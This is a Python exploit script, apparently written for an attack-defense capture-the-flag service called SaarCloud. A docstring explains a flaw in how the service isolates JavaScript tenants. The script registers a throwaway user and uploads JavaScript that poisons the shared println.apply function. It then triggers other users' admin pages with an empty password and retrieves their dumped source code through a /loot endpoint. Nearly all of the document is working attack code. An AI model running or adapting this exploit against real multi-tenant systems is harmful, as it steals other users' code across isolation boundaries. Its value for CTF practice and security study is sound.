import random
import socket
import string

import requests
import sys


"""
Different JS execution environments are improperly isolated:
- they share the same JS context
- they share the same security token due to a bug (which is always "library.js" instead of the script's filename)
- they share the same functions (e.g. println)

Now we override println.apply with custom code. 
On a wrong password, the admin page uses debug(), which in turn uses println.apply, executing our code.
We then dump the code and write it into a shared array, which we retrieve later on.
"""


ATTACK = r'''
var collected_code = [];

// This handler poisons the current context's "debug" function. When debug calls "println.apply", the calling function will be dumped and stored.
LambdaRequests.get(/^\/attack$/, async (request, match) => {
    println.apply = function() {
        let code = arguments.callee.caller.caller.toString();
        collected_code.push(code);
    };
    return "OK";
});

// This handler retrieves the stored code
LambdaRequests.get(/^\/loot$/, async (request, match) => { return collected_code; });
'''


def random_string(l=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))


class SaarCloudSession(requests.Session):
    def __init__(self, ip: str, hostname='default'):
        super().__init__()
        if hostname == 'default':
            hostname = 'www'
        if '.' not in ip:
            ip = socket.gethostbyname(ip)
        self.base = f'http://{hostname}.{ip}.nip.io:8080'

    def get(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().get(url, **kwargs)

    def post(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().post(url, **kwargs)


def exploit(target):
    session = SaarCloudSession(target)
    # We attack users relying on "lambda"
    users = session.get('/api/featured').json()['lambda']

    # Register a new user and upload attack script
    username = random_string()
    token = session.post('/api/register/lambda', json={'username': username}).json()['token']
    session.post(f'/api/lambda/write/{username}?token={token}', data=ATTACK)
    # trigger handler to poison "println"/"debug" functions
    print('Calling attack ...')
    session_our_user = SaarCloudSession(target, username)
    print('GET /attack:', session_our_user.get('/attack').text)
    # request user websites, causing them to use "debug"
    for user in users:
        print(f'Calling admin on {user["name"]} ...')
        session_target = SaarCloudSession(target, user["name"])
        print('POST /admin:', session_target.post('/admin', json={'password': ''}).text)
    print('Fetch collected code ...')
    for code in session_our_user.get('/loot').json():
        print('CODE: ', code)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else '127.1.0.1')
